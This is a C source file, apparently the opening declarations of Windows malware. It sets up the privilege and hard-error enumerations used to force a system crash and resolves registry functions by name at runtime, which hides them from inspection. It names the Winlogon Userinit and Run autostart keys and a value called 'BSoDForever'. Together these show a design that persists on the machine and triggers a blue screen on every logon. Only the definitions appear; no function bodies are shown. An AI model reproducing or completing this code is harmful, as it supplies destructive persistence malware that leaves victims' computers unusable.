#include <Windows.h>
#include <winternl.h>
#include <stdlib.h>
#include <time.h>

enum PRIVILEGES {
	SeCreateTokenPrivilege = 1,
	SeAssignPrimaryTokenPrivilege,
	SeLockMemoryPrivilege,
	SeIncreaseQuotaPrivilege,
	SeUnsolicitedInputPrivilege,
	SeMachineAccountPrivilege,
	SeTcbPrivilege,
	SeSecurityPrivilege,
	SeTakeOwnershipPrivilege,
	SeLoadDriverPrivilege,
	SeSystemProfilePrivilege,
	SeSystemtimePrivilege,
	SeProfileSingleProcessPrivilege,
	SeIncreaseBasePriorityPrivilege,
	SeCreatePagefilePrivilege,
	SeCreatePermanentPrivilege,
	SeBackupPrivilege,
	SeRestorePrivilege,
	SeShutdownPrivilege,
	SeDebugPrivilege,
	SeAuditPrivilege,
	SeSystemEnvironmentPrivilege,
	SeChangeNotifyPrivilege,
	SeRemoteShutdownPrivilege,
	SeUndockPrivilege,
	SeSyncAgentPrivilege,
	SeEnableDelegationPrivilege,
	SeManageVolumePrivilege,
	SeImpersonatePrivilege,
	SeCreateGlobalPrivilege,
	SeTrustedCredManAccessPrivilege,
	SeRelabelPrivilege,
	SeIncreaseWorkingSetPrivilege,
	SeTimeZonePrivilege,
	SeCreateSymbolicLinkPrivilege
};

typedef enum _HARDERROR_RESPONSE {
	ResponseReturnToCaller,
	ResponseNotHandled,
	ResponseAbort,
	ResponseCancel,
	ResponseIgnore,
	ResponseNo,
	ResponseOk,
	ResponseRetry,
	ResponseYes
} HARDERROR_RESPONSE, *PHARDERROR_RESPONSE;

typedef enum _HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, *PHARDERROR_RESPONSE_OPTION;

#ifdef UNICODE
#define ADVAPI32PTH TEXT("advapi32.dll")
#define ROKE "RegOpenKeyExW"
#define ROKEF LSTATUS (*RegOpenKeyE)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY)
#define ROKEF2 (LSTATUS (*)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY))
#define RSVE "RegSetValueExW"
#define RSVEF LSTATUS (*RegSetValueE)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE *, DWORD)
#define RSVEF2 (LSTATUS (*)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE *, DWORD))
#define REGPTH1 TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")
#define REGPTH2 TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
#define REGKEY1 TEXT("Userinit")
#define REGKEY2 TEXT("BSoDForever")
#define NTDLLPTH TEXT("ntdll.dll")
#else
#define ADVAPI32PTH "advapi32.dll"
#define ROKE "RegOpenKeyExA"
#define ROKEF LSTATUS (*RegOpenKeyE)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY)
#define ROKEF2 (LSTATUS (*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY))
#define RSVE "RegSetValueExA"
#define RSVEF LSTATUS (*RegSetValueE)(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD)
#define RSVEF2 (LSTATUS (*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD))
#define REGPTH1 "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
#define REGPTH2 "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGKEY1 "Userinit"
#define REGKEY2 "BSoDForever"
#define NTDLLPTH "ntdll.dll"
#endif
